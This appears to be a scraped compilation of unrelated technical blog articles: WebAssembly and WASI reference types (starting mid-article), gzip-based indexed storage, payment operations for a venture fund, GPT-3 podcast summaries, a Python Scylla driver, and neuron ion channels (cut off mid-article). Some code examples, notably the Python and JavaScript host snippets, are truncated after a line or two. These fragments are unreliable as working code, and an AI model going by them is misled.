    <span>drop</span><span>))</span>
</code></pre></div></div>

<p>This Wasm module will run in <em>any</em> WebAssembly environment where WASI is
available.<sup id="back-ref-wasi-available"><a href="#foot-ref-wasi-available">0</a></sup> We don’t need glue code that is
maintaining a side table, mapping host references to indices.</p>

<h3 id="python">Python</h3>

<p>For example, we can run <code>hello.wat</code> from <a href="https://github.com/bytecodealliance/wasmtime-py/">a Python host
environment</a> without any glue code:</p>

<div><div><pre><code><span>from</span> <span>wasmtime</span> <span>import</span> <span>*</span>

<p>Running <code>hello.wat</code> — once again, without module-specific glue code
— is just as easy in <a href="https://github.com/bytecodealliance/wasmtime-dotnet/">.NET</a> and <a href="https://github.com/bytecodealliance/wasmtime-go">Go</a> host
environments, and is left as an exercise for the reader ;)</p>

<h3 id="on-the-web">On the Web</h3>

<p>Unlike the other host environments we’ve considered, WASI isn’t natively
implemented on the Web. There’s nothing stopping us, however, from polyfilling
WASI APIs with a little bit of JavaScript and a couple DOM methods! This is
still an improvement because there is overall less module-specific glue
code. Once one person has written the polyfills, everyone’s Wasm modules can
reuse them.</p>

<p>There are many different things an “open file” could be modeled by on the
Web. For this demo, we’ll use a DOM node: writing to it will append text
nodes. This works well because we know our module is only writing text data. If
we were working with binary data, we would choose another polyfilling approach,
like in-memory array buffers backing the file data.</p>

<p>Here is the JavaScript code to run our <code>hello.wat</code> module and polyfill our
<code>future-wasi.write</code> function:</p>

<div><div><pre><code><span>// The DOM node we will use as an "open file".</span>
<span>const</span> <span>output</span> <span>=</span> <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>"</span><span>output</span><span>"</span><span>);</span>

<p>You can view a live demo of this code in the iframe below. It should work in
Firefox 79+, or any other browser that supports reference types (at the time of
writing, Chrome has support for an older version of the reference types proposal
behind the <code>--experimental-wasm-anyref</code> flag, and Safari has in-progress support
behind the <code>JSC_useWebAssemblyReferences</code> flag.)</p>



<h2 id="what-comes-after-the-reference-types-proposal">What Comes After the Reference Types Proposal?</h2>

<p>The in-progress <a href="https://github.com/WebAssembly/proposal-type-imports/blob/master/proposals/type-imports/Overview.md">WebAssembly type imports proposal</a> builds on
reference types to let you distinguish between different kinds of host objects:
database connections and open files would be separate types. Or, on the Web,
Wasm would distinguish JavaScript <code>Promise</code>s from DOM nodes. It also adds
references that point to types defined by other Wasm modules, not just host
objects.</p>

<p>WASI will want to adopt unforgable reference types for file handles, as the
examples above suggest, instead of using integers. It might make sense for WASI
to wait for type imports, however, so it can use separate types for, say, an
open file and a source of entropy. This is a decision for the WASI subgroup of
the WebAssembly Community Group. Either way, when WASI does make this switch, it
will continue to support integer file descriptors, but implemented inside the
Wasm sandbox as indices into an <code>externref</code> Wasm table.</p>

<p>The <a href="https://github.com/WebAssembly/interface-types/blob/master/proposals/interface-types/Explainer.md">interface types</a> and <a href="https://github.com/WebAssembly/module-linking/blob/master/proposals/module-linking/Explainer.md">module linking</a> proposals promise to remove even more
glue code and bindings. The interface …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This article demonstrates how specially crafted but ordinary gzip archives can be used as a database like storage. It also introduces a <a href="https://github.com/ProfoundNetworks/gzipi">Python package</a> and explains how it works.</p><p><a href="https://en.wikipedia.org/wiki/Gzip">gzip</a> is a popular file compression format to store large amounts of raw data. It has a good data compression ratio, but relatively slow compression/decompression speed.</p><p>Many companies use it in Big data applications when they need to store compressed CSV or JSON lines files. Such file formats are <strong>row-oriented</strong> and usually processed line by line. gzip can save a lot of space, especially when you have repetitive field names in JSON files.</p><p>Unfortunately, a compressed file can only be accessed in the streaming fashion. Even if you have a sorted file and you know that you don't need the first half of the file — you can't jump to an arbitrary point in a file without starting decompressing it from the start of the file.</p><h2>gzip format</h2><p>A single gzip archive can only contain one file. Any gzip file starts with a magic number (1f 8b) followed by a 10-byte header that contains metadata. After the header, it contains compressed data followed by CRC32 checksum and the size of the original file.</p><p>The most interesting detail about the format is that gzip <a href="https://tools.ietf.org/html/rfc1952">RFC</a> allows multiple compressed files to be concatenated into a single file. Since gzip only allows to compress one file, multiple concatenated archives will still produce one file when decompressing.</p><p>Here is how two concatenated gzip files look like:</p><p><img src="https://rushter.com/static/uploads/img/gzip/multiple.svg" width="150"></p><p>You can think of it as concatenating two txt files. The final file will have content from both files. To combine multiple compressed files, you can use the <code>cat</code> command from GNU tools.</p><div><pre><span></span><code>$ <span>echo</span> <span>'123'</span> <span>|</span> gzip &gt; <span>1</span>.txt.gz
$ <span>echo</span> <span>'456'</span> <span>|</span> gzip &gt; <span>2</span>.txt.gz
$ cat <span>1</span>.txt.gz <span>2</span>.txt.gz &gt; <span>3</span>.txt.gz
$ zcat <span>3</span>.txt.gz
<span>123</span>
<span>456</span>
</code></pre></div><p>The <code>zcat</code> command is an alias to <code>gunzip -c</code>.</p><h2>Semi-random access</h2><p>An ability to concatenate multiple archives is a very handy property. By exploiting this feature and trading a little bit of speed and disk space, we can achieve semi-random access. By random access, I mean the ability to read an arbitrary offset of data from a file without reading the whole file.</p><p>To implement semi-random access, we need to split our uncompressed input into small chunks and compress them separately. We can chunk it by the number of lines. We can also chunk it by the number of bytes rounded to the nearest line end.</p><p>Let's suppose we have 1TB of JSON lines data that contains 10M of HTML webpages from <a href="https://commoncrawl.org/">Common Crawl</a> (CC). Since it takes a lot of space, we want to compress our data. When our dataset is compressed, it only takes around 180GB, which is <strong>six times</strong> less than storing uncompressed data. HTML data have a lot of repetitive tags, and they can be compressed pretty efficiently.</p><p>We also want to have random access to be able to sample smaller subsets of data without reading the whole archive. To do so, we can chunk (partition) our input by 10-100 lines and make a gzip archive from each chunk. We can do this on the go and append all the compressed chunks on the go to a single file.</p><p>Since our gzip archive is now chunked, we can jump to a random position in a file and search for the nearest gzip block. As we already know, each gzip file starts with a magic number and a specially defined header, so it's possible to locate each chunk's start.</p><p>To be able to perform line-level random access, we can chunk our input by one line. That is, we can make a separate archive from each line of our input. This gives us better random access but comes with a cost.</p><p>An empty gzip archive takes 20 bytes of space. If your lines are very short, gzipping each line can make a compressed file even bigger than the original input.</p><h2>gzip file as a database</h2><p>If each row in your data has a unique key, you can index it for faster lookups. For example, each row in our Common Crawl data has a domain name as a primary key. The <a href="https://en.wikipedia.org/wiki/Primary_key">primary key</a> length is relatively short compared to the content of the other fields (HTML and HTTP headers).</p><p>Since we already chunk our data, we can keep the start of the gzipped chunk for each of our primary keys. Primary keys are usually short, and we can store such information in a separate uncompressed txt file. This will be our index.</p><p>Gzipped files contain binary data. Thus, we need to keep the byte offset:</p><div><pre><span></span><code>domain_name|byte_offset_start
</code></pre></div><p>If the number of chunks is large, you can also store the line start (local character offset) inside the gzipped archive. This allows us to jump a particular line quickly. For additional speed gains, we can also keep offset size or offset end.</p><div><pre><span></span><code>domain_name|gzip_byte_offset_start|gzip_byte_offset_end|char_offset_start|char_offset_end
</code></pre></div><p>Every modern file-system supports random access and allows us to read an arbitrary offset of a file. Given a row from our index file, we can first jump to our specific gzip chunk. After locating it, we can decompress it on the go and skip first n characters until we hit the start of the line that we need to retrieve.</p><p>Given the index line, we can retrieve any row in <strong>almost</strong> <strong>constant time</strong>. When using an SSD storage, searching for a single line on 200GB of compressed Common Crawl data takes less than 0.1 seconds.</p><p>The plaintext index for 10 million domains takes around 500MB of disk space, which is nothing compared to the size of HTML data.</p><h2>Binary search</h2><p>Fast lookups sound very interesting, but searching for a specific key in the index file takes time too. For the CC use case, we need an ability to quickly find an arbitrary domain name in our index file.</p><p>The <a href="https://en.wikipedia.org/wiki/Binary_search_algorithm">binary search</a> algorithm can be very handy for this problem. All we need to do is to sort our index file by the key. We don't need to load the index file in memory, because we can use random access to jump to specific lines of the uncompressed file.</p><p>This article is already pretty long, so I won't get into details of how binary search works. It's a very fast algorithm, and it takes around 20 jumps on average to find the domain name in 10M of rows. If you haven't heard about it, you can have a look at a <a href="http://www.cs.armstrong.edu/liang/animation/web/BinarySearch.html">visualization</a>.</p><p>The main idea of the algorithm is to split the available data in half on each iteration and check the key in the middle. Since all data is sorted, we can quickly locate the primary key by knowing which side to keep and split next.</p><p>When everything is combined, the complete search system takes <strong>less than 0.3 seconds</strong> to search in the 1TB of compressed data.</p><p>I came up with this idea with <a href="https://github.com/mpenkov">Michael Penkov</a>, and we use such an approach for real tasks. We also wrote a <a href="https://github.com/ProfoundNetworks/gzipi">Python package</a> called <code>gzipi</code>, and the <a href="https://github.com/ProfoundNetworks/gzipi/blob/master/gzipi/lib.py">whole implementation</a> takes less than 1k of lines when using GNU tools (such as <code>cat</code>, <code>sort</code>, and <code>gzip</code>). The code is easy to learn and understand.</p><h2>How to use gzipi</h2><p>To start using gzipi, you need to have Python and <code>pip</code> installed on your system:</p><p>Please note that you also need GNU tools on your system. It works on Linux and macOS without any problems.</p><p>After installation, you can repack your existing gzip file:</p><div><pre><span></span><code><span>$</span> gzipi repack -f websites.json.gz -i index.gzi -o websites_repacked.json.gz --format json --field domain
</code></pre></div><p>The <code>field</code> argument specifies primary key. The input format could be <code>csv</code> or <code>json</code>.</p><p>Now you can search for an arbitrary key:</p><div><pre><span></span><code><span>$</span> gzipi search --input-file websites_repacked.json.gz --index-file index.gzi --key google.com
</code></pre></div><h2>S3 support and cost savings</h2><p>One of our requirements was to support S3 as a storage for our compressed files. Fortunately, S3 allows reading arbitrary offsets, so we don't need to store compressed files locally. Since binary search takes most of the time, storing index files locally significantly speeds up the search.</p><p>If you have gzipped JSON lines files, <a href="https://aws.amazon.com/athena/">Amazon athena</a> provides a solution to query them using SQL syntaxis. It's a very convenient solution, but Amazon charges $5 per T.B. of data scanned. Using Amazon's solution would potentially cost us <strong>thousands</strong> of dollars per month, and our solution cost us almost nothing because reading data from S3 from the same region is free.</p><h2>Possible improvements</h2><p>There are many ways to improve the search even more. Them main benefit of our solution is that it does not require a third-party database and takes very little RAM.</p><p>Instead of using the binary search algorithm, you can use B-tree or MARISA-trie structures. To use them, you need to store the index file in memory.</p><p>Instead of storing keys (domain names) in a file, you can also use hash tables, but that requires storing intermediate gzip files when compressing the data. When using hash tables, you don't need to store domain names. The only thing that is required is the start of the gzip chunk for each bucket.</p><h2>Afterword</h2><p>It took me a few days to implement an initial solution to our problem, and when I was writing it, we didn't know that there are similar solutions to query billions of webpages. As it turned out later, Common Crawl and Web Archive use pretty similar solutions. Common Crawl uses <a href="https://iipc.github.io/warc-specifications/specifications/warc-format/warc-1.0/">WARC</a> files to store HTTP responses, and each response is stored as a single gzip chunk. It also uses <a href="https://github.com/webrecorder/pywb">pywb</a> library that provides an <a href="https://index.commoncrawl.org/CC-MAIN-2020-34">API</a> and indexing capabilities.</p><p>Such an approach allows Common Crawl to query <strong>2.45 billion web pages</strong> without using a database. Since all CC data is on the S3, it also scales very well. Everyone that has access to S3 can query the data without talking to a centralized server.</p><p>The main difference is that our approach is focused on JSON and CSV files that contain much smaller sets of data (narrow data) on each row. Because of that, I use tens of thousands of rows per each gzip chunk.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><em>Note: Modern Treasury empowers teams to make payment operations simple, scalable, and secure. The “Guides” series walks through representative businesses or payment processes and explains step by step how best to go about building them from scratch. ‍</em><br></p><p>‍</p><h4>Introduction</h4><p>Venture capital and private equity funds have become a large industry, with <a href="https://www.firstrepublic.com/-/media/frb/documents/pdfs/innovators/Preqin-and-First-Republic-Update-US-Venture-Capital-in-2019---V2.pdf?mkt_tok=eyJpIjoiWVRnNU1EZzBOREUzWVdZNSIsInQiOiJyY001aGduS01TZDRQejViQTladFVEK2c0VXY0VHh3MldCc0plK3VIaUhVUkxVeFRNZWd5N3" target="_blank">hundreds</a> of new funds getting started on an annual basis. They range in size from an angel investor investing a million dollars to giant growth and PE funds managing $100 billion or more.&nbsp;<br></p><p>The key to success lies in the investing decisions: attracting deal flow, identifying deals to invest in, winning those deals, and managing the companies to a successful outcome, be it an acquisition or IPO. But in addition to these there are the mechanics of fund operations, from receiving capital calls from Limited Partners (an “LP” is an investor in a fund), wiring funds to portfolio companies, receiving the proceeds from sales of the companies or sales of shares post IPO, and distributing those back to LPs.&nbsp;<br></p><p>For smaller funds, these operations tend to be outsourced to fund custodians, third parties that handle the backoffice of funds and manage incoming and outgoing wires. These third parties can get quite large. Some examples include <a href="https://www.gen2fund.com/" target="_blank">Gen II Fund Services</a>, <a href="https://www.bbh.com/en-us" target="_blank">Brown Brothers Harriman</a>, or <a href="https://www.ssctech.com/solutions/products-a-to-z/private-equity-services" target="_blank">SS&amp;C</a>. Larger firms often build an in-house team to manage these operations. But regardless of the specific organizational setup, the work tends to be quite similar, and the pressure on maintaining cost and accuracy leads to more <a href="https://www.privatefundscfo.com/7-reasons-us-private-equity-firms-are-finally-outsourcing-their-fund-administration/" target="_blank">focus</a> on automation.&nbsp;<br></p><p>This post is a guide to the operational, money movement aspects of private investing. While the specifics of the investments and the horizon for repayment might vary widely, we hope that this guide is useful in simplifying and demystifying how a fund might automate some of its internal operations.&nbsp;<br></p><p>‍</p><h4>The User Experience</h4><p>Let’s start with defining the user experience for a new fund. Let’s say our new team, which is expert in bagels, believes there’s a wave of innovation coming to that space. With Sesame, Everything, and Pumpernickel showing success in the market, more is coming. So, the team launches Bagel Ventures and raises a new venture fund (“Bagel Ventures I”) to invest in startups. They will raise their fund from 10 limited partners (LPs) who are the endowments, pension funds, and individuals investing in the fund. Bagel Ventures will not receive all the funds at the outset. Rather, they will ask for funds as they prepare for a new investment, and receive “capital calls” from each of the 10 LPs.&nbsp;<br></p><p>The fund flow might involve the following steps:</p><ol role="list"><li>The team identifies a new investment (“Have you heard of pickle bagels?!”).</li><li>The Fund sends capital call requests to all LPs, and receives 10 wires, one per LP.</li><li>The Fund wires the investment to the company.&nbsp;</li><li>After a while, the company sells and the Fund receives their share of the proceeds.</li><li>The Fund distributes the proceeds to the LPs, each getting what they are due, and keeps a carry fee for itself.&nbsp;<br></li></ol><p>In reality, things might be more complex. There could be multiple funding rounds for a company, and it might be a mixture of equity and debt. We haven’t accounted for fees. For simplicity’s sake, we will use only the case outlined above of a single investment round followed by an exit, and develop a payment ops architecture based on that.<br></p><p>‍</p><h4>Payment Ops Architecture</h4><p>Before setting up any payment flows, Bagel Ventures has to establish a banking relationship and open accounts. There might be an Operating Account for the fund for things such as payroll, rent, and other expenses, and a separate Investing Account for investments and distributions. For the purposes of this payment ops architecture, we’ll consider just the Investing Account.&nbsp;<br></p><p>Let’s assume you build for the following setup:&nbsp;<em>‍</em></p><figure id="w-node-2886e96df8b3-b8df1e0f"><p><img src="https://assets.website-files.com/5d7e7bbbcad517dd46cb55d3/5f467bc3a95047322fd177eb_Fund%20Custodian%202.jpg" loading="lazy" alt=""></p><figcaption>Investment phase: many capital call wires come in to the Investing Account to fund one investment wire to be sent to the company.</figcaption></figure><p>‍</p><figure id="w-node-9be230dca25d-b8df1e0f"><p><img src="https://assets.website-files.com/5d7e7bbbcad517dd46cb55d3/5f467b9c6f1a0d0f38966c77_Fund%20Custodian%201.jpg" loading="lazy" alt=""></p><figcaption>Exit phase: company sells, one wire arrives to the investing Account and is split into wires sent to many LP accounts and one Fund Operating Account for carry.</figcaption></figure><p>The Fund custodian team and software will oversee the regular collection and disbursement of investment funds, and make sure that everything is tracked and reconciled accordingly.</p><p>‍</p><h4>API Calls and Timings</h4><p>With this payment ops architecture in hand, we’re ready to build.&nbsp;</p><p>‍</p><h5>Step 1: Collect bank account details from LPs and from the Company</h5><p>Bagel Ventures first needs to collect the Company’s bank account details. Let’s call the company Pickle Bagels, Inc., and its first product is pickle bagels. To do so, you first create a counterparty in Modern Treasury, and populate it with the bank account and routing numbers you have received (<a href="https://www.moderntreasury.com/journal/how-to-collect-and-verify-bank-accounts-for-ach" target="_blank">more here</a> on common methods of authenticating accounts, such as Plaid):<br></p><h6>curl --request POST \<br>&nbsp;&nbsp;-u ORGANIZATION_ID:API_KEY \<br>&nbsp;&nbsp;--url https://app.moderntreasury.com/api/counterparties \<br>&nbsp;&nbsp;-H 'Content-Type: application/json' \<br>&nbsp;&nbsp;-d '{<br>&nbsp;&nbsp;"name": "Pickle Bagels, Inc.",<br>&nbsp;&nbsp;"accounts": [<br>&nbsp;&nbsp;&nbsp;&nbsp;{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"account_type": "checking",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"routing_details": [<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"routing_number_type": "aba",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"routing_number": "121141822"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"account_details": [<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"account_number": "123456789"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]<br>&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;]}'</h6><p>In addition to the account and routing number, you might want to hold additional information about the counterparty in metadata. This information might include how much of the fund that LP invested, any unique arrangements, and other information.</p><p>‍</p><h5>Step 2: Collect capital call wires</h5><p>A counterparty creation response will notify you that everything has been successfully set up. Now that a counterparty exists, you can initiate payments to or from LPs. If LPs allow this, you can ACH debit them for their contribution. More likely, however, the large amounts prevent the use of ACH and the preference is for wires, primarily because ACH is reversible and wires are not. To identify and automatically match the incoming wire, you can create an Expected Payment object for each incoming wire with the information you expect, such as amount, counterparty, payment type, and date range.&nbsp;This can be done over API&nbsp;or manually. As an example, here's what this might look like done manually: </p><figure id="w-node-2629a0d055b5-b8df1e0f"><p><img src="https://assets.website-files.com/5d7e7bbbcad517dd46cb55d3/5f4707cc10e4094e68ff9005_Screen%20Shot%202020-08-26%20at%206.04%201.jpg" loading="lazy" alt=""></p></figure><p>Now, once the expected payment is set up Modern Treasury will scan the account for this incoming information and automatically match it when it’s received. Alternatively, if the LP did not send the wire and the end of the date range has arrived, Modern Treasury will notify you that the fund has not received the expected funds.&nbsp;</p><p>‍</p><h5>Step 3: Fund the investment</h5><p>Once the funds have all arrived, you can fund the investment in Pickle Bagels, Inc. Let’s say Pickle Bagels is getting $10,000,000 from our Fund in this investment round, and is planning on A/B testing bagels and seeing which ones are gone fastest. Given the amount, you will most likely choose to send that amount via wire. Note that the amount is in cents, not dollars, so it shows up as 1000000000:<br></p><h6>curl --request POST \<br>&nbsp;&nbsp;-u ORGANIZATION_ID:API_KEY \<br>&nbsp;&nbsp;--url https://app.moderntreasury.com/api/payment_orders \<br>&nbsp;&nbsp;-H 'Content-Type: application/json' \<br>&nbsp;&nbsp;-d '{<br>&nbsp;&nbsp;"type": "wire",<br>&nbsp;&nbsp;"amount": 1000000000,<br>&nbsp;&nbsp;"direction": "credit",<br>&nbsp;&nbsp;"currency": "USD",<br>&nbsp;&nbsp;"originating_account": "Bagel Ventures account ID",<br>&nbsp;&nbsp;"receiving_account_id": "Pickle Bagels bank account ID",<br>&nbsp;&nbsp;"counterparty_id": "Pickle Bagels counterparty ID"<br>}'</h6><p>Once the payment goes through, the Fund account will be debited $10,000,000 and the Company will be funded for its next phase of bagel testing.&nbsp;</p><p>Finally, you want to add metadata to the payment for future reference. In addition to metadata tags (eg. key value pairs such as Type: SeriesA or Sector: Bageltech) you might also attach the PDF for the legal docs, or the CSV calculating the amounts, for future reference. This will be useful for finance and audit teams that might have to answer questions about this payment in the future.</p><p>‍</p><h5>Step 3: Receive funds at exit</h5><p>Now, after what could be a few months or a decade, Pickle Bagels, Inc. might sell and the fund will register a return on its investment. For simplicity, let’s assume the company sells in an all-cash transaction such that each investment comes back as a cash disbursement based on the terms of the sale agreement.&nbsp;</p><p>The Fund is notified that it will receive $30,000,000 back from the investment, tripling its original investment. In that case, you can set up an Expected Payment for the incoming funds, just as in Step 2 above, and reconcile an incoming wire when it comes in from the acquiring company.&nbsp;<br></p><p>‍</p><h5>Step 4: Disburse the investment return</h5><p>Finally, once you’ve reconciled the incoming wire, you can collect the Fund’s fees by transferring those funds to the Operating account, and setting up a disbursal to each of the investors in ten separate wires.&nbsp;<br></p><p>That’s it. With these four actions you can set up the payment ops architecture for a simple private investment fund and focus on finding the right entrepreneurs and companies to back and invest in.&nbsp;<br></p><p>‍</p><h4>What Can Go Wrong?</h4><p>Payment operations software, such as <a href="https://www.moderntreasury.com/" target="_blank">Modern Treasury</a>, can manage not only the happy path as described above but also edge cases when things go wrong. A common issue could be handling an ACH return associated with a specific <a href="https://docs.moderntreasury.com/reference#ach-return-reason-codes" target="_blank">return code</a>.&nbsp;<br></p><p>Another might be a customer service issue if an LP funds too little or too much funds, combines two investments in one, or makes some other unexpected action. In that case, there might be a new transaction necessary or an explanatory note for future reconciliations or audits. Ops teams can process these easily while maintaining the integrity of the data, since all payments sent or received are easily captured and displayed. In the future, accountants and auditors won’t be left wondering about a wire, since the information explaining it can be captured directly tied to the bank statement in question.&nbsp;<br></p><p>‍</p><h4>More?</h4><p>This post laid out a simple architecture for payment ops at a VC or PE fund, …</p></div></div></div>

			<p>Open AI’s GPT-3 has been in the news a lot recently for a number of reasons. Developers have used this new API to do things from <a href="https://www.theverge.com/2020/8/16/21371049/gpt3-hacker-news-ai-blog">writing blog posts that make it to the top of Hacker News</a>, to <a href="https://www.businessinsider.in/tech/news/10-things-gpt-3-can-do-examples-and-use-cases/slidelist/77449901.cms#slideid=77450339">creating search engines and more</a>.</p>
<p>Today, we’re happy to announce you can add <strong>podcasts</strong> to the list of things GPT-3 is beginning to revolutionize!</p>
<p>The HyperCatcher app has now applied this exciting technology to our premium podcasts. Using GPT-3 and a little other magic you can now view a summary of your favorite podcasts before you listen. You can even jump past topics you’re not interested in (or commercials) and get to the good stuff more easily than ever!</p>

<figure><img loading="lazy" src="https://secureservercdn.net/104.238.71.109/g6p.a50.myftpupload.com/wp-content/uploads/2020/08/2020-08-19-22.06.45.gif" alt="" width="321" height="671"></figure>
<h2>How Did We Do It?</h2>
<p>GPT-3 is a cutting edge machine learning model that’s been trained on content across the internet. This makes GPT-3 the perfect model for creative text generation. GPT-3 or a subsequent Machine Learning model from OpenAI might be great at creating podcasts from scratch one day given a topic, but we’re not quite there yet. One step removed from whole cloth podcast creation is summarizing existing podcasts and that’s exactly what we’re using GPT-3 for!</p>
<p>With GPT-3 the hard part is coming up with the right question and the right format for the question that will prompt the AI to fill in the answer with the right mix of creativity and understanding of the given question.</p>
<p>For example, if you sign up for Open AI’s beta you’ll get access to the GPT-3 playground that comes loaded with some preset prompts. One of these prompts is:</p>
<p>My second grader asked me what this passage means:</p>
<p>From here you can fill in the paragraph with a sample passage. For example, we could use a paragraph of text from a podcast like so:</p>
<p><em>My second grader asked me what this passage means:</em></p>
<p><em>“they age they saved money for a rainy day but this is four months that’s a long time miss you know what it’s not eat but it is to live a normal life with a car payment and a mortgage and a Verizon bill yeah that’s a lot of money but but you know what people shouldn’t have car payments”</em></p>
<p>Plugging this into the GPT-3 playground we might get a result like this:</p>
<p><em>I told her that it meant he was going to miss her and be sad because she’s not there. She said, “no, I think he’s saying that he doesn’t have a car payment.”</em></p>
<p>That’s pretty creative, but it’s not exactly a summary of the given text</p>
<p>This is where some of the parameters given by the API allow us to tweak the creativity and length of the response come in handy. In addition to tweaking parameters we might also give a few examples of what we consider “good” summaries of text that GPT-3 can use as a reference.</p>
<p>After applying those changes GPT-3 will give us something more like this:</p>
<p><em>“People shouldn’t have car payments.”</em></p>
<p>Now, we can basically feed a transcript of the entire podcast to GPT-3 in chunks and retrieve summaries of each part of the podcast that can be displayed to users!</p>

<p>At <a href="https://www.ultrabug.fr/scylla-summit-2019/" target="_blank" rel="noreferrer noopener">Scylla summit 2019</a> I had the chance to meet <strong>Israel Fruchter</strong> and we dreamed of working on adding <strong>shard-awareness</strong> support to the Python cassandra-driver which would be known as <strong>scylla-driver</strong>.</p>



<p>A few months later, when Israel reached out to me on the Scylla-Users #pythonistas Slack channel with the <a rel="noreferrer noopener" href="https://github.com/scylladb/python-driver/pull/6" target="_blank">first draft PR</a> I was so excited that I jumped in the wagon to help!</p>



<p>The efforts we put into the scylla-driver paid off and significantly improved the performance of the production applications that I had the chance to switch to using it by 15 to 25%!</p>

<p>Before we reached those numbers and even released the scylla-driver to PyPi, EuroPython 2020 RFP was open and <a href="https://ep2020.europython.eu/talks/a-deep-dive-and-comparison-of-python-drivers-for-cassandra-and-scylla/" target="_blank" rel="noreferrer noopener">I submitted a talk proposal which was luckily accepted </a>by the community.</p>



<p>So I had the chance to deep-dive into Cassandra vs Scylla architecture differences, explain the rationale behind creating the scylla-driver and give Python code details on how we implemented it and the challenges we faced doing so. Check my talk spage for </p>



<p>I also explained that I wrote an <a rel="noreferrer noopener" href="https://groups.google.com/g/scylladb-dev/c/SUx0OBlY7iw" target="_blank">RFC on the scylla-dev mailing list</a> which lead the developers of Scylla to implement a new connection-to-shard algorithm that will allow clients connecting to a new listening port to select the actual shard they want a connection to.</p>



<p>This is an expected major optimization from the current mostly random way of connecting to all shards and I’m happy to say that <a rel="noreferrer noopener" href="https://github.com/scylladb/scylla/commit/1572b9e41cd02e8b676404ba72a549398d281a66" target="_blank">it’s been implemented</a> and is ready to be put to use by all the scylla drivers.</p>



<p>I’ve recently been contacted by PyCon India and other Python related conferences organizers for a talk so I’ve submitted one to PyCon India where I hope I’ll be able to showcase even better numbers thanks to the new algorithm!</p>



<p>After my Europython talk we also had very interesting discussions with Pau Freixes about his work on a <a rel="noreferrer noopener" href="https://github.com/pfreixes/acsylla" target="_blank">fully asynchronous Python driver that wraps the C++ driver</a> to get the best possible performance. First results are absolutely amazing so if you’re interested in this, make sure to give it a try and contribute to the driver!</p>



<p>Stay tuned for more amazing query latencies 😉</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      
        <p>A few weeks ago, for various reasons I decided to start reading a neuroscience textbook (<a href="https://www.sciencedirect.com/book/9780123858702/fundamental-neuroscience" target="_blank" rel="noopener">Fundamental Neuroscience</a>). Though dense, it’s packed with interesting information that filled a lot of gaps in my knowledge about the brain.</p>
<p>One of those gaps was about how exactly the information travels through a neuron. Up to this point, all I knew was “something involving electric pulses”. </p>
<p>The reality, it turns out, is more interesting: neurons use ion channels to create and strengthen electric signals, and propagate information along their lengths.</p>
<p>So here is more or less how I understand this so far.</p>
<p>First, a quick recap of the neuron structure.</p>
<p><img src="https://i-kh.net/images/the-magic-of-ion-channels/neuron-overview.png" alt="A typical neuron. Source: your brain."></p>
<p>A neuron has the main cell body. From that body, it grows a large number of branched extensions called “dendrites”. These usually serve as the input “wires”, though they also do some signal processing. </p>
<p>Neuron usually also grows another long extension called an “axon”. This is normally the cell’s output, and it can be up to a meter long in humans, though in the brain it’s usually shorter.</p>
<p>Let’s zoom in to the axon. First, we’ll look at shorter axons, because longer ones have myelin sheath, which will complicate the picture.</p>
<p>The fluid inside the neuron (cytoplasm) and the intercellular fluid between the neurons have a number of ions dissolved in them: calcium (Ca²⁺), potassium (K⁺), sodium (Na⁺), chlorine (Cl⁻), and others.</p>
<p>For various reasons, neurons actively work to pump out Na⁺, Ca²⁺, and Cl⁻, so these are much more concentrated outside the cell than inside the cell. If the membrane wasn’t keeping them out, they’d quickly rush into the cell. Some still leak back in.</p>
<p>Similarly, neurons actively work to concentrate K⁺ inside.</p>
<p><img src="https://i-kh.net/images/the-magic-of-ion-channels/pumping-ions.png" alt="A crude depiction of a Na⁺-K⁺ pump, one of the mechanisms maintaining the ion balance in the neuron. Na⁺-K⁺ pump removes three Na⁺ ions for two K⁺ ions."></p>
<p>Each of the ions carries a charge, so the end result of this pumping is that the cell’s inside is negatively charged relative to the outside. This voltage difference is called the “membrane potential”. Resting membrane potential is typically between -75 and -40 mV (millivolts).</p>
<p>Ion channels are small valves set in the cell’s surface that let ions through if certain conditions are met. Some are opened by specific chemicals binding to them (e.g. neurotransmitters), while others open when the voltage inside the cell rises high enough. The latter are called “voltage-gated ion channels”, and they’re the ones we’re interested in.</p>
<p>Voltage-gated ion channels exist on all parts of a neuron, but are most concentrated in the axon. Most let through a specific ion: there are Na⁺ channels, K⁺ channels, Ca²⁺ channels, etc. </p>
<p>Let’s take a look at how Na⁺ channels and K⁺ channels would work to produce a voltage spike (called an “action potential”). </p>
<p><img src="https://i-kh.net/images/the-magic-of-ion-channels/ion-channels-1.png" alt="Neuron membrane in resting state. Channels are closed; membrane voltage is around -73 mV."></p>
<p>If something increases the cell membrane voltage to -55 mV, Na⁺ channels quickly open and let in a lot of Na⁺ ions. These ions carry a positive charge, so they quickly raise the voltage across the membrane to +30 mV. Then the channels automatically close. This happens over the span of milliseconds.</p>
<p>At the same time, K⁺ channels open and start letting out some K⁺ ions, opposing the Na⁺ current and slowing the voltage increase. The channels first open slowly, but after a while, the K⁺ current strengthens. </p>
<p><img src="https://i-kh.net/images/the-magic-of-ion-channels/ion-channels-2.png" alt="Voltage spikes up after the channels open. Na⁺ are flowing quickly, and K⁺ are flowing slowly. Na⁺ channel is about to close."></p>
